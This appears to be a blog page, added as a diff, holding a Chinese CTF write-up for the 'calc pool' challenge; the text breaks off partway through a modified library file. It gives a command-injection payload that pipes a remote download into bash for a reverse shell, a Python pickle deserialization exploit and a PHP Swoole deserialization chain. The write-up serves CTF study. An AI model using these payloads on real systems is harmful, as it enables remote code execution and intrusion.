@@ -1,0 +1,1525 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>AntCTF x D^3CTF calc pool |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="AntCTF x D^3CTF calc pool |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="AntCTF x D^3CTF calc pool"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/ZN3xqG-rM/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>AntCTF x D^3CTF calc pool</h1>
+            <span class="meta">
+            	Posted on
+              2021-03-08，25 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>根据题目给的docker。大致意思如下</p>
+<pre><code>    
+                                                -&gt;python
+    nodejs-&gt;web界面+发送数据-&gt;php
+                                                -&gt;java
+</code></pre>
+<p>我们看到的界面就是nodejs的。随手测了下。发现a和b。反引号直接就执行命令了<br>
+弹shell</p>
+<pre><code>calc?language=php&amp;action=add&amp;a=2&amp;b=`curl xxxxxxxx/shell2.html|bash`
+</code></pre>
+<p>进入以后。直接读app.js</p>
+<pre><code>const fs = require('fs')
+const express = require('express')
+const {exec} = require('child_process')
+const format = require(&quot;string-format&quot;)
+const dotenv = require(&quot;dotenv&quot;);
+
+dotenv.config()
+
+const app = express()
+
+app.use(express.static('public'));
+
+app.get(&quot;/&quot;, (req, res) =&gt; {
+    return res.redirect(&quot;/redirect?filename=index.html&quot;)
+})
+
+app.get(&quot;/redirect&quot;, (req, res) =&gt; {
+    let filename = req.query.filename
+    res.sendFile(`${__dirname}/` + filename)
+})
+
+
+app.get('/calc', (req, res) =&gt; {
+    let params = req.query
+    var lang = params.language !== undefined ? params.language : &quot;python&quot;
+
+    let calc_client_path = {
+        &quot;python&quot;: process.env.py_calc_tool_path,
+        &quot;php&quot;: process.env.php_calc_tool_path,
+        &quot;java&quot;: process.env.java_calc_tool_path
+    }
+
+    if (lang === 'python') {
+        let data = {
+            &quot;action&quot;: params.action,
+            &quot;a&quot;: params.a,
+            &quot;b&quot;: params.b,
+            &quot;ip&quot;: process.env.py_calc_address,
+            &quot;port&quot;: process.env.py_calc_port
+        }
+        var cmd = format(calc_client_path.python + &quot; &quot; + '-action {action} -a {a} -b {b} -ip {ip} -p {port}', data)
+    } else if (lang === 'php') {
+        let data = {
+            &quot;action&quot;: params.action,
+            &quot;a&quot;: params.a,
+            &quot;b&quot;: params.b,
+            &quot;ip&quot;: process.env.php_calc_address,
+            &quot;port&quot;: process.env.php_calc_port
+        }
+        var cmd = format(calc_client_path.php + &quot; &quot; + '-action {action} -a {a} -b {b} -ip {ip} -p {port}', data)
+    } else if (lang === 'java') {
+        let data = {
+        &quot;action&quot;: params.action,
+        &quot;a&quot;: params.a,
+        &quot;b&quot;: params.b,
+        &quot;ip&quot;: process.env.java_calc_address,
+        &quot;port&quot;: process.env.java_calc_port
+    }
+        var cmd = format(&quot;java -jar&quot; + &quot; &quot; + calc_client_path.java + &quot; &quot; + '-action {action} -a {a} -b {b} -ip {ip} -p {port}', data)
+    }
+
+    try {
+        exec(cmd, ((error, stdout, stderr) =&gt; {
+            res.send(stdout)
+        }))
+    } catch (e) {
+        res.send(&quot;Something Error&quot;)
+    }
+})
+
+
+const port = process.env.web_app_port
+
+app.listen(port, () =&gt; {
+    console.log(`App listening at http://0.0.0.0:${port}`)
+})
+</code></pre>
+<p>简单读一下。就是三个client。发送数据。没了<br>
+一个个拖下来。</p>
+<h1 id="python部分">Python部分</h1>
+<pre><code>objcopy --dump-section pydata=pydata.dump pythonclient
+python3 pyinstxtractor.py pydata.dump
+cd pydata.dump_extracted
+uncompyle6 client.py
+</code></pre>
+<p>得到源码</p>
+<pre><code>import socket, sys, _pickle as pickle, argparse
+from Calculator import Calculator
+
+def generate_data(action, a, b):
+    obj = Calculator(action, a, b)
+    data = pickle.dumps(obj)
+    return data
+
+
+def send_data(ip, port, pickle_data):
+    address = (
+     ip, int(port))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(3)
+    try:
+        s.connect(address)
+    except Exception:
+        print('Server not found or not open')
+        sys.exit()
+
+    try:
+        try:
+            s.sendall(pickle_data)
+            recv_c = s.recv(1024)
+            print(recv_c.decode())
+        except Exception:
+            s.close()
+
+    finally:
+        s.close()
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-ip', '--ip_address', help='',
+      required=True)
+    parser.add_argument('-p', '--port', help='', required=True)
+    parser.add_argument('-action', help='', required=True)
+    parser.add_argument('-a', help='', required=True)
+    parser.add_argument('-b', help='', required=True)
+    args = parser.parse_args()
+    if args.ip_address is None:
+        args.ip_address = '127.0.0.1'
+    if args.port is None:
+        args.port = 8080
+    data = generate_data(args.action, args.a, args.b)
+    send_data(args.ip_address, args.port, data)
+# okay decompiling client.pyc
+</code></pre>
+<p>pickle.dumps。不多说了。exp：</p>
+<pre><code>import socket, sys, _pickle as pickle,os
+
+
+class Calculator(object):
+    def __init__(self,action,a,b):
+        self.a = a 
+        self.b = b 
+    def __reduce__(self):
+        return (os.system, ('curl xxxxxxxx',))
+
+def generate_data(action, a, b):
+    obj = Calculator(action, a, b)
+    data = pickle.dumps(obj)
+    return data
+
+
+def send_data(ip, port, pickle_data):
+    address = (
+     ip, int(port))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(3)
+    try:
+        s.connect(address)
+    except Exception:
+        print('Server not found or not open')
+        sys.exit()
+
+    try:
+        try:
+            s.sendall(pickle_data)
+            recv_c = s.recv(1024)
+            print(recv_c.decode())
+        except Exception:
+            s.close()
+
+    finally:
+        s.close()
+
+
+if __name__ == '__main__':
+    data = generate_data('add', 1,2)
+    send_data('172.18.0.5', 8080, data)
+</code></pre>
+<p>成功命令执行<br>
+<img src="https://guokeya.github.io/post-images/1615184116555.png" alt="" loading="lazy"></p>
+<h1 id="php部分">PHP部分</h1>
+<p>在tmp能看到解压后的代码。用phar extractto也能获得源码</p>
+<pre><code>&lt;?php
+
+include_once __DIR__ . &quot;/Calculator.php&quot;;
+
+$params = $argv;
+
+$i = 0;
+
+$action = $params[$i + 2];
+$a = $params[$i + 4];
+$b = $params[$i + 6];
+$ip = $params[$i + 8];
+$port = $params[$i + 10];
+
+
+$calculator = new Calculator($action, $a, $b);
+$data = serialize($calculator);
+
+// send serialize data
+$client = new Swoole\Client(SWOOLE_SOCK_TCP);
+if (!$client-&gt;connect($ip, $port, -1)) {
+    exit(&quot;connect failed. Error: {$client-&gt;errCode}\n&quot;);
+}
+$client-&gt;send($data);
+echo $client-&gt;recv();
+$client-&gt;close();
+&lt;?php
+
+class Calculator
+{
+    private $action;
+    private $a;
+    private $b;
+    private $res;
+
+    function __construct($action, $a, $b)
+    {
+        $this-&gt;action = $action;
+        $this-&gt;a = $a;
+        $this-&gt;b = $b;
+    }
+
+    private function add()
+    {
+        $this-&gt;res = $this-&gt;a + $this-&gt;b;
+    }
+
+    private function sub()
+    {
+        $this-&gt;res = $this-&gt;a - $this-&gt;b;
+    }
+
+    private function mul()
+    {
+        $this-&gt;res = $this-&gt;a * $this-&gt;b;
+    }
+
+    private function div()
+    {
+        $this-&gt;res = $this-&gt;a / $this-&gt;b;
+    }
+
+    public function __invoke()
+    {
+        // TODO: Implement __invoke() method.
+        if ($this-&gt;action == 'add') {
+            $this-&gt;add();
+        } elseif ($this-&gt;action == &quot;sub&quot;) {
+            $this-&gt;sub();
+        } elseif ($this-&gt;action == &quot;mul&quot;) {
+            $this-&gt;mul();
+        } elseif ($this-&gt;action == &quot;div&quot;) {
+            $this-&gt;div();
+        }
+
+        return $this-&gt;res;
+    }
+}
+</code></pre>
+<p>随便整点东西。发现服务端报swoole的错误。本地php im|grep swoole发现是4.6.3的swoole<br>
+下源码。跟了下。发现RCTF null的非预期解可以用。<br>
+在源码中。发现最后执行是在_invoke魔术方法中。猜测服务端估计是<br>
+<code>$object=unserialize(用户输入);$object()</code><br>
+所以。直接null的exp打就行了</p>
+<p>Exp.py</p>
+<pre><code>// Author: Wupco (http://www.wupco.cn/)
+&lt;?php
+// https://github.com/swoole/library/blob/master/src/core/Curl/Handler.php#L309-L319
+// delete(L309-L319) (bypass is_resource check) and change class name to Handlep
+include(&quot;Handler.php&quot;);
+
+function process_serialized($serialized)
+{
+    $new = '';
+    $last = 0;
+    $current = 0;
+    $pattern = '#\bs:([0-9]+):&quot;#';
+
+    while (
+            $current &lt; strlen($serialized) &amp;&amp;
+            preg_match(
+                $pattern,
+                $serialized,
+                $matches,
+                PREG_OFFSET_CAPTURE,
+                $current
+            )
+        ) {
+        $p_start = $matches[0][1];
+        $p_start_string = $p_start + strlen($matches[0][0]);
+        $length = $matches[1][0];
+        $p_end_string = $p_start_string + $length;
+
+        # Check if this really is a serialized string
+        if (!(
+            strlen($serialized) &gt; $p_end_string + 2 &amp;&amp;
+                substr($serialized, $p_end_string, 2) == '&quot;;'
+        )) {
+            $current = $p_start_string;
+            continue;
+        }
+        $string = substr($serialized, $p_start_string, $length);
+
+        # Convert every special character to its S representation
+        $clean_string = '';
+        for ($i=0; $i &lt; strlen($string); $i++) {
+            $letter = $string{$i};
+            $clean_string .= ctype_print($letter) &amp;&amp; $letter != '\\' ?
+                    $letter :
+                    sprintf(&quot;\\%02x&quot;, ord($letter));
+            ;
+        }
+
+        # Make the replacement
+        $new .=
+                substr($serialized, $last, $p_start - $last) .
+                'S:' . $matches[1][0] . ':&quot;' . $clean_string . '&quot;;'
+            ;
+        $last = $p_end_string + 2;
+        $current = $last;
+    }
+
+    $new .= substr($serialized, $last);
+    return $new;
+}
+$o = new Swoole\Curl\Handlep(&quot;http://baidu.com/&quot;);
+$o-&gt;setOpt(CURLOPT_READFUNCTION, &quot;array_walk&quot;);
+$o-&gt;setOpt(CURLOPT_FILE, &quot;array_walk&quot;);
+$o-&gt;exec = array('curl xxxxx');
+$o-&gt;setOpt(CURLOPT_POST, 1);
+$o-&gt;setOpt(CURLOPT_POSTFIELDS, &quot;aaa&quot;);
+$o-&gt;setOpt(CURLOPT_HTTPHEADER, [&quot;Content-type&quot;=&gt;&quot;application/json&quot;]);
+$o-&gt;setOpt(CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
+
+$a = serialize([$o,'exec']);
+echo str_replace(&quot;Handlep&quot;, &quot;Handler&quot;, urlencode(process_serialized($a)));
+</code></pre>
+<p>Handler.php</p>
+<pre><code>&lt;?php
+/**
+ * This file is part of Swoole.
+ *
+ * @link     https://www.swoole.com
+ * @contact  team@swoole.com
+ * @license  https://github.com/swoole/library/blob/master/LICENSE
+ */
+
+/* @noinspection PhpComposerExtensionStubsInspection, PhpDuplicateSwitchCaseBodyInspection, PhpInconsistentReturnPointsInspection */
+
+declare(strict_types=1);
+
+namespace Swoole\Curl;
+
+use CURLFile;
+use ReflectionClass;
+use Swoole;
+use Swoole\Constant;
+use Swoole\Coroutine\Http\Client;
+use Swoole\Curl\Exception as CurlException;
+use Swoole\Http\Status;
+
+final class Handlep
+{
+    /**
+     * @var Client
+     */
+    private $client;
+
+    private $info = [
+        'url' =&gt; '',
+        'content_type' =&gt; '',
+        'http_code' =&gt; 0,
+        'header_size' =&gt; 0,
+        'request_size' =&gt; 0,
+        'filetime' =&gt; -1,
+        'ssl_verify_result' =&gt; 0,
+        'redirect_count' =&gt; 0,
+        'total_time' =&gt; 5.3E-5,
+        'namelookup_time' =&gt; 0.0,
+        'connect_time' =&gt; 0.0,
+        'pretransfer_time' =&gt; 0.0,
+        'size_upload' =&gt; 0.0,
+        'size_download' =&gt; 0.0,
+        'speed_download' =&gt; 0.0,
+        'speed_upload' =&gt; 0.0,
+        'download_content_length' =&gt; -1.0,
+        'upload_content_length' =&gt; -1.0,
+        'starttransfer_time' =&gt; 0.0,
+        'redirect_time' =&gt; 0.0,
+        'redirect_url' =&gt; '',
+        'primary_ip' =&gt; '',
+        'certinfo' =&gt; [],
+        'primary_port' =&gt; 0,
+        'local_ip' =&gt; '',
+        'local_port' =&gt; 0,
+        'http_version' =&gt; 0,
+        'protocol' =&gt; 0,
+        'ssl_verifyresult' =&gt; 0,
+        'scheme' =&gt; '',
+    ];
+
+    private $withHeaderOut = false;
+
+    private $withFileTime = false;
+
+    private $urlInfo;
+
+    private $postData;
+
+    private $infile;
+
+    private $infileSize = PHP_INT_MAX;
+
+    private $outputStream;
+
+    private $proxyType;
+
+    private $proxy;
+
+    private $proxyPort = 1080;
+
+    private $proxyUsername;
+
+    private $proxyPassword;
+
+    private $clientOptions = [];
+
+    private $followLocation = false;
+
+    private $autoReferer = false;
+
+    private $maxRedirects;
+
+    private $withHeader = false;
+
+    private $nobody = false;
+
+    /** @var callable */
+    private $headerFunction;
+
+    /** @var callable */
+    private $readFunction;
+
+    /** @var callable */
+    private $writeFunction;
+
+    /** @var callable */
+    private $progressFunction;
+
+    private $returnTransfer = false;
+
+    private $method = '';
+
+    private $headers = [];
+
+    private $headerMap = [];
+
+    private $transfer;
+
+    private $errCode = 0;
+
+    private $errMsg = '';
+
+    private $failOnError = false;
+
+    private $closed = false;
+
+    private $cookieJar = '';
+
+    public function __construct(string $url = '')
+    {
+        if ($url) {
+            $this-&gt;setUrl($url);
+        }
+    }
+
+    public function __toString()
+    {
+        $id = spl_object_id($this);
+        return &quot;Object({$id}) of type (curl)&quot;;
+    }
+
+    /* ====== Public APIs ====== */
+
+    public function isAvailable(): bool
+    {
+        if ($this-&gt;closed) {
+            trigger_error('supplied resource is not a valid cURL handle resource', E_USER_WARNING);
+            return false;
+        }
+        return true;
+    }
+
+    public function setOpt(int $opt, $value): bool
+    {
+        return $this-&gt;isAvailable() and $this-&gt;setOption($opt, $value);
+    }
+
+    public function exec()
+    {
+        if (!$this-&gt;isAvailable()) {
+            return false;
+        }
+        return $this-&gt;execute();
+    }
+
+    public function getInfo()
+    {
+        return $this-&gt;isAvailable() ? $this-&gt;info : false;
+    }
+
+    public function errno()
+    {
+        return $this-&gt;isAvailable() ? $this-&gt;errCode : false;
+    }
+
+    public function error()
+    {
+        return $this-&gt;isAvailable() ? $this-&gt;errMsg : false;
+    }
+
+    public function reset()
+    {
+        if (!$this-&gt;isAvailable()) {
+            return false;
+        }
+        foreach ((new ReflectionClass(static::class))-&gt;getDefaultProperties() as $name =&gt; $value) {
+            $this-&gt;{$name} = $value;
+        }
+    }
+
+    public function getContent()
+    {
+        if (!$this-&gt;isAvailable()) {
+            return false;
+        }
+        return $this-&gt;transfer;
+    }
+
+    public function close()
+    {
+        if (!$this-&gt;isAvailable()) {
+            return false;
+        }
+        foreach ($this as &amp;$property) {
+            $property = null;
+        }
+        $this-&gt;closed = true;
+    }
+
+    private function create(?array $urlInfo = null): void
+    {
+        if ($urlInfo === null) {
+            $urlInfo = $this-&gt;urlInfo;
+        }
+        $this-&gt;client = new Client($urlInfo['host'], $urlInfo['port'], $urlInfo['scheme'] === 'https');
+    }
+
+    private function getUrl(): string
+    {
+        if (empty($this-&gt;urlInfo['path'])) {
+            $url = '/';
+        } else {
+            $url = $this-&gt;urlInfo['path'];
+        }
+        if (!empty($this-&gt;urlInfo['query'])) {
+            $url .= '?' . $this-&gt;urlInfo['query'];
+        }
+        if (!empty($this-&gt;urlInfo['fragment'])) {
+            $url .= '#' . $this-&gt;urlInfo['fragment'];
+        }
+        return $url;
+    }
+
+    private function setUrl(string $url, bool $setInfo = true): bool
+    {
+        if (strlen($url) === 0) {
+            $this-&gt;setError(CURLE_URL_MALFORMAT, 'No URL set!');
+            return false;
+        }
+        if (strpos($url, '://') === false) {
+            $url = 'http://' . $url;
+        }
+        if ($setInfo) {
+            $urlInfo = parse_url($url);
+            if (!is_array($urlInfo)) {
+                $this-&gt;setError(CURLE_URL_MALFORMAT, &quot;URL[{$url}] using bad/illegal format&quot;);
+                return false;
+            }
+            if (!$this-&gt;setUrlInfo($urlInfo)) {
+                return false;
+            }
+        }
+        $this-&gt;info['url'] = $url;
+        return true;
+    }
+
+    private function setUrlInfo(array $urlInfo): bool
+    {
+        if (empty($urlInfo['scheme'])) {
+            $urlInfo['scheme'] = 'http';
+        }
+        $scheme = $urlInfo['scheme'];
+        if ($scheme !== 'http' and $scheme !== 'https') {
+            $this-&gt;setError(CURLE_UNSUPPORTED_PROTOCOL, &quot;Protocol \&quot;{$scheme}\&quot; not supported or disabled in libcurl&quot;);
+            return false;
+        }
+        $host = $urlInfo['host'];
+        if ($this-&gt;info['primary_port'] !== 0) {
+            /* keep same with cURL, primary_port has the highest priority */
+            $urlInfo['port'] = $this-&gt;info['primary_port'];
+        } elseif (empty($urlInfo['port'])) {
+            $urlInfo['port'] = $scheme === 'https' ? 443 : 80;
+        } else {
+            $urlInfo['port'] = intval($urlInfo['port']);
+        }
+        $port = $urlInfo['port'];
+        if ($this-&gt;client) {
+            $oldUrlInfo = $this-&gt;urlInfo;
+            if (($host !== $oldUrlInfo['host']) || ($port !== $oldUrlInfo['port']) || ($scheme !== $oldUrlInfo['scheme'])) {
+                /* target changed */
+                $this-&gt;create($urlInfo);
+            }
+        }
+        $this-&gt;urlInfo = $urlInfo;
+        return true;
+    }
+
+    private function setPort(int $port): void
+    {
+        $this-&gt;info['primary_port'] = $port;
+        if (!isset($this-&gt;urlInfo['port']) || $this-&gt;urlInfo['port'] !== $port) {
+            $this-&gt;urlInfo['port'] = $port;
+            if ($this-&gt;client) {
+                /* target changed */
+                $this-&gt;create();
+            }
+        }
+    }
+
+    private function setError($code, $msg = ''): void
+    {
+        $this-&gt;errCode = $code;
+        $this-&gt;errMsg = $msg ? $msg : curl_strerror($code);
+    }
+
+    private function hasHeader(string $headerName): bool
+    {
+        return isset($this-&gt;headerMap[strtolower($headerName)]);
+    }
+
+    private function setHeader(string $headerName, string $value): void
+    {
+        $lowerCaseHeaderName = strtolower($headerName);
+
+        if (isset($this-&gt;headerMap[$lowerCaseHeaderName])) {
+            unset($this-&gt;headers[$this-&gt;headerMap[$lowerCaseHeaderName]]);
+        }
+
+        if ($value !== '') {
+            $this-&gt;headers[$headerName] = $value;
+            $this-&gt;headerMap[$lowerCaseHeaderName] = $headerName;
+        } else {
+            // remove empty headers (keep same with raw cURL)
+            unset($this-&gt;headerMap[$lowerCaseHeaderName]);
+        }
+    }
+
+    /**
+     * @param mixed $value
+     * @throws Swoole\Curl\Exception
+     */
+    private function setOption(int $opt, $value): bool
+    {
+        switch ($opt) {
+            // case CURLOPT_STDERR:
+            // case CURLOPT_WRITEHEADER:
+            case CURLOPT_FILE:
+            case CURLOPT_INFILE:
+                if (!is_resource($value)) {
+                    //trigger_error('swoole_curl_setopt(): supplied argument is not a valid File-Handle resource', E_USER_WARNING);
+                    //return false;
+                }
+                break;
+        }
+
+        switch ($opt) {
+            /*
+             * Basic
+             */
+            case CURLOPT_URL:
+                return $this-&gt;setUrl((string) $value);
+            case CURLOPT_PORT:
+                $this-&gt;setPort((int) $value);
+                break;
+            case CURLOPT_FORBID_REUSE:
+                $this-&gt;clientOptions[Constant::OPTION_KEEP_ALIVE] = !$value;
+                break;
+            case CURLOPT_RETURNTRANSFER:
+                $this-&gt;returnTransfer = $value;
+                $this-&gt;transfer = '';
+                break;
+            case CURLOPT_ENCODING:
+                if (empty($value)) {
+                    if (defined('SWOOLE_HAVE_ZLIB')) {
+                        $value = 'gzip, deflate';
+                    }
+                    if (defined('SWOOLE_HAVE_BROTLI')) {
+                        if (!empty($value)) {
+                            $value = 'br, ' . $value;
+                        } else {
+                            $value = 'br';
+                        }
+                    }
+                    if (empty($value)) {
+                        break;
+                    }
+                }
+                $this-&gt;setHeader('Accept-Encoding', $value);
+                break;
+            case CURLOPT_PROXYTYPE:
+                if ($value !== CURLPROXY_HTTP and $value !== CURLPROXY_SOCKS5) {
+                    throw new Swoole\Curl\Exception(
+                        'swoole_curl_setopt(): Only support following CURLOPT_PROXYTYPE values: CURLPROXY_HTTP, CURLPROXY_SOCKS5'
+                    );
+                }
+                $this-&gt;proxyType = $value;
+                break;
+            case CURLOPT_PROXY:
+                $this-&gt;proxy = $value;
+                break;
+            case CURLOPT_PROXYPORT:
+                $this-&gt;proxyPort = $value;
+                break;
+            case CURLOPT_PROXYUSERNAME:
+                $this-&gt;proxyUsername = $value;
+                break;
+            case CURLOPT_PROXYPASSWORD:
+                $this-&gt;proxyPassword = $value;
+                break;
+            case CURLOPT_PROXYUSERPWD:
+                $usernamePassword = explode(':', $value);
+                $this-&gt;proxyUsername = urldecode($usernamePassword[0]);
+                $this-&gt;proxyPassword = urldecode($usernamePassword[1] ?? null);
+                break;
+            case CURLOPT_PROXYAUTH:
+                /* ignored temporarily */
+                break;
+            case CURLOPT_NOBODY:
+                $this-&gt;nobody = boolval($value);
+                $this-&gt;method = 'HEAD';
+                break;
+            case CURLOPT_IPRESOLVE:
+                if ($value !== CURL_IPRESOLVE_WHATEVER and $value !== CURL_IPRESOLVE_V4) {
+                    throw new Swoole\Curl\Exception(
+                        'swoole_curl_setopt(): Only support following CURLOPT_IPRESOLVE values: CURL_IPRESOLVE_WHATEVER, CURL_IPRESOLVE_V4'
+                    );
+                }
+                break;
+            case CURLOPT_TCP_NODELAY:
+                $this-&gt;clientOptions[Constant::OPTION_OPEN_TCP_NODELAY] = boolval($value);
+                break;
+            /*
+             * Ignore options
+             */
+            case CURLOPT_VERBOSE:
+                // trigger_error('swoole_curl_setopt(): CURLOPT_VERBOSE is not supported', E_USER_WARNING);
+            case CURLOPT_SSLVERSION:
+            case CURLOPT_NOSIGNAL:
+            case CURLOPT_FRESH_CONNECT:
+            /*
+             * From PHP 5.1.3, this option has no effect: the raw output will always be returned when CURLOPT_RETURNTRANSFER is used.
+             */
+            case CURLOPT_BINARYTRANSFER: /* TODO */
+            case CURLOPT_DNS_USE_GLOBAL_CACHE:
+            case CURLOPT_DNS_CACHE_TIMEOUT:
+            case CURLOPT_STDERR:
+            case CURLOPT_WRITEHEADER:
+            case CURLOPT_BUFFERSIZE:
+            case CURLOPT_SSLCERTTYPE:
+            case CURLOPT_SSLKEYTYPE:
+            case CURLOPT_NOPROXY:
+            case CURLOPT_CERTINFO:
+            case CURLOPT_HEADEROPT:
+            case CURLOPT_PROXYHEADER:
+                break;
+            /*
+             * SSL
+             */
+            case CURLOPT_SSL_VERIFYHOST:
+                break;
+            case CURLOPT_SSL_VERIFYPEER:
+                $this-&gt;clientOptions[Constant::OPTION_SSL_VERIFY_PEER] = $value;
+                break;
+            case CURLOPT_SSLCERT:
+                $this-&gt;clientOptions[Constant::OPTION_SSL_CERT_FILE] = $value;
+                break;
+            case CURLOPT_SSLKEY:
+                $this-&gt;clientOptions[Constant::OPTION_SSL_KEY_FILE] = $value;
+                break;
+            case CURLOPT_CAINFO:
+                $this-&gt;clientOptions[Constant::OPTION_SSL_CAFILE] = $value;
+                break;
+            case CURLOPT_CAPATH:
+                $this-&gt;clientOptions[Constant::OPTION_SSL_CAPATH] = $value;
+                break;
+            case CURLOPT_KEYPASSWD:
+            case CURLOPT_SSLCERTPASSWD:
+            case CURLOPT_SSLKEYPASSWD:
+                $this-&gt;clientOptions[Constant::OPTION_SSL_PASSPHRASE] = $value;
+                break;
+            /*
+             * Http POST
+             */
+            case CURLOPT_POST:
+                $this-&gt;method = 'POST';
+                break;
+            case CURLOPT_POSTFIELDS:
+                $this-&gt;postData = $value;
+                if (!$this-&gt;method) {
+                    $this-&gt;method = 'POST';
+                }
+                break;
+            /*
+             * Upload
+             */
+            case CURLOPT_SAFE_UPLOAD:
+                if (!$value) {
+                    trigger_error('swoole_curl_setopt(): Disabling safe uploads is no longer supported', E_USER_WARNING);
+                    return false;
+                }
+                break;
+            /*
+             * Http Header
+             */
+            case CURLOPT_HTTPHEADER:
+                if (!is_array($value) and !is_iterable($value)) {
+                    trigger_error('swoole_curl_setopt(): You must pass either an object or an array with the CURLOPT_HTTPHEADER argument', E_USER_WARNING);
+                    return false;
+                }
+                foreach ($value as $header) {
+                    $header = explode(':', $header, 2);
+                    $headerName = $header[0];
+                    $headerValue = trim($header[1] ?? '');
+                    $this-&gt;setHeader($headerName, $headerValue);
+                }
+                break;
+            case CURLOPT_REFERER:
+                $this-&gt;setHeader('Referer', $value);
+                break;
+            case CURLINFO_HEADER_OUT:
+                $this-&gt;withHeaderOut = boolval($value);
+                break;
+            case CURLOPT_FILETIME:
+                $this-&gt;withFileTime = boolval($value);
+                break;
+            case CURLOPT_USERAGENT:
+                $this-&gt;setHeader('User-Agent', $value);
+                break;
+            case CURLOPT_CUSTOMREQUEST:
+                $this-&gt;method = (string) $value;
+                break;
+            case CURLOPT_PROTOCOLS:
+                if (($value &amp; ~(CURLPROTO_HTTP | CURLPROTO_HTTPS)) != 0) {
+                    throw new CurlException(&quot;swoole_curl_setopt(): CURLOPT_PROTOCOLS[{$value}] is not supported&quot;);
+                }
+                break;
+            case CURLOPT_REDIR_PROTOCOLS:
+                if (($value &amp; ~(CURLPROTO_HTTP | CURLPROTO_HTTPS)) != 0) {
+                    throw new CurlException(&quot;swoole_curl_setopt(): CURLOPT_REDIR_PROTOCOLS[{$value}] is not supported&quot;);
+                }
+                break;
+            case CURLOPT_HTTP_VERSION:
+                if ($value != CURL_HTTP_VERSION_1_1) {
+                    trigger_error(&quot;swoole_curl_setopt(): CURLOPT_HTTP_VERSION[{$value}] is not supported&quot;, E_USER_WARNING);
+                    return false;
+                }
+                break;
+            case CURLOPT_FAILONERROR:
+                $this-&gt;failOnError = $value;
+                break;
+            /*
+             * Http Cookie
+             */
+            case CURLOPT_COOKIE:
+                $this-&gt;setHeader('Cookie', $value);
+                break;
+            case CURLOPT_COOKIEJAR:
+                $this-&gt;cookieJar = (string) $value;
+                break;
+            case CURLOPT_COOKIEFILE:
+                if (is_file((string) $value)) {
+                    $this-&gt;setHeader('Cookie', file_get_contents($value));
+                }
+                break;
+            case CURLOPT_CONNECTTIMEOUT:
+                $this-&gt;clientOptions[Constant::OPTION_CONNECT_TIMEOUT] = $value;
+                break;
+            case CURLOPT_CONNECTTIMEOUT_MS:
+                $this-&gt;clientOptions[Constant::OPTION_CONNECT_TIMEOUT] = $value / 1000;
+                break;
+            case CURLOPT_TIMEOUT:
+                $this-&gt;clientOptions[Constant::OPTION_TIMEOUT] = $value;
+                break;
+            case CURLOPT_TIMEOUT_MS:
+                $this-&gt;clientOptions[Constant::OPTION_TIMEOUT] = $value / 1000;
+                break;
+            case CURLOPT_FILE:
+                $this-&gt;outputStream = $value;
+                break;
+            case CURLOPT_HEADER:
+                $this-&gt;withHeader = $value;
